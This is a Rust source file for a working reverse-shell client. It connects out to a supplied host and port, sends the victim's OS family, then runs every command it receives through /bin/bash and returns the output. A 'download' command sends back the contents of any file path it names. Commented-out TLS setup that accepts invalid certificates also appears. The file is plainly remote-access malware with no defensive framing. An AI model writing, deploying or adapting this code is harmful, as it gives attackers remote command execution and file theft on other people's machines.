use std::error::Error;
use std::fs::File;
use std::io::{Read, Write};
use std::process::{exit, Command};

use native_tls::{TlsConnector, TlsStream};
use std::net::TcpStream;

enum HandlerStatus {
    Ok,
    MetadataError,
    FileError,
    CmdError,
    EndSession,
    SendError,
}

pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
    let mut clt = TcpStream::connect(i.to_owned() + ":" + p)?;
    //println!(
    //    "[+] TCP connection success to the listener at {}",
    //    clt.peer_addr()?
    //);
    //let mut connector_builder = TlsConnector::builder();
    //connector_builder.danger_accept_invalid_certs(true);
    //connector_builder.danger_accept_invalid_hostnames(true);
    //let connector = connector_builder.build()?;

    //let stream = connector.connect("dummy", clt);
    /*let mut tls_stream = match stream {
    Ok(s) => s,
    Err(r) => {
        println!("TLS handshake error : {}", r);
        exit(6);
    }
    };*/

    let os = std::env::consts::FAMILY;
    let res = clt.write_all(os.as_bytes());

    if res.is_err() {
        println!("Error sending OS info : {}", res.err().unwrap());
        exit(7);
    }

    loop {
        let mut buff = [0; 4096];
        let read = clt.read(&mut buff);
        let bytes_read = match read {
            Ok(b) => b,
            Err(r) => {
                println!("Reading error : {}", r);
                continue;
            }
        };

        let cmd = String::from_utf8_lossy(&buff[..bytes_read])
            .trim_end_matches('\0')
            .to_string();

        match handler(cmd, &mut clt) {
            HandlerStatus::Ok => (),
            HandlerStatus::MetadataError => {
                println!("File metadata error");
                continue;
            }
            HandlerStatus::FileError => {
                println!("File error");
                continue;
            }
            HandlerStatus::CmdError => {
                println!("Command error");
                continue;
            }
            HandlerStatus::EndSession => {
                println!("Ending session");
                break;
            }
            HandlerStatus::SendError => {
                println!("Error sending data");
                continue;
            }
        }

        clt.flush()?;
    }

    //clt.shutdown()?;
    Ok(())
}

fn handler(cmd: String, tls_stream: &mut TcpStream) -> HandlerStatus {
    if cmd.starts_with("download") {
        dl_cmd(&cmd, tls_stream)
    } else if cmd.starts_with(".quit") {
        HandlerStatus::EndSession
    } else {
        run_cmd(&cmd, tls_stream)
    }
}

fn dl_cmd(cmd: &String, tls_stream: &mut TcpStream) -> HandlerStatus {
    let path: Vec<&str> = cmd.split(' ').collect();
    match File::open(path[1]) {
        Ok(mut file) => {
            let mut file_buffer = [0; 4096];
            loop {
                let bytes_read = file.read(&mut file_buffer).expect("failed to read");
                if bytes_read == 0 {
                    break;
                }
                let status = tls_stream.write_all(&file_buffer[..bytes_read]);
                if status.is_err() {
                    return HandlerStatus::SendError;
                }
            }
            HandlerStatus::Ok
        }
        Err(_) => HandlerStatus::FileError,
    }
}

fn run_cmd(cmd: &String, tls_stream: &mut TcpStream) -> HandlerStatus {
    let res = run(cmd);
    if res.is_none() {
        return HandlerStatus::CmdError;
    }
    let mut res = res.unwrap();
    if res.is_empty() {
        let status = tls_stream.write_all("\0".as_bytes());
        if status.is_err() {
            HandlerStatus::SendError
        } else {
            HandlerStatus::Ok
        }
    } else {
        let mut buff_to_send = [0; 4096];
        loop {
            let mut count = 0;
            for c in &res {
                if count == 4096 {
                    break;
                }
                buff_to_send[count] = *c;
                count += 1;
            }
            let status = tls_stream.write(&buff_to_send);
            if status.is_err() {
                return HandlerStatus::SendError;
            }
            buff_to_send = [0; 4096];
            if count < 4096 {
                break;
            }
            res = res.split_off(count);
        }
        HandlerStatus::Ok
    }
}

fn run(cmd: &String) -> Option<Vec<u8>> {
    let exec = Command::new("/bin/bash")
        .args(["-c", cmd.trim_end_matches("\r\n")])
        .output();
    if exec.is_err() {
        return None;
    }
    let exec = exec.unwrap();

    let stdo = exec.stdout.as_slice();
    let stderr = exec.stderr.as_slice();

    if stderr.is_empty() {
        Some(stdo.to_vec())
    } else {
        Some(stderr.to_vec())
    }
}
